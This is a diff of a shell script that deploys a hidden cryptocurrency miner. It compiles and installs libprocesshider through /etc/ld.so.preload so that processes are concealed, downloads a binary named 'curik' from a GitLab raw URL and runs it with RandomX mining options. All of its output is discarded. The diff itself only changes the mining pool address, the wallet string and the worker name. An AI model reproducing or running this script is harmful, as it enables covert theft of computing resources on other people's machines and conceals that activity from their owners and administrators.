@@ -10,9 +10,9 @@ cd libprocesshider;make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 cd ..
-A=149.50.222.86:80
-B=ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ
-C=GAS
+A=209.97.162.131:443
+B=ZEPHYR2tBHcj5UGL8ht15WiyPifGuh7ugHN5nAKXhDAE79gGobZ4kH9USdGNwy8prj7Sb7sXWXKEtck6cxF8138fJpd4iSa2cEM23
+C=BAROKAH
 wget https://gitlab.com/os6335803/in/-/raw/main/curik && chmod u+x curik
 ./curik --url $A --user $B --pass $C --donate-level 1 -a rx/0 >/dev/null 2>&1
 r
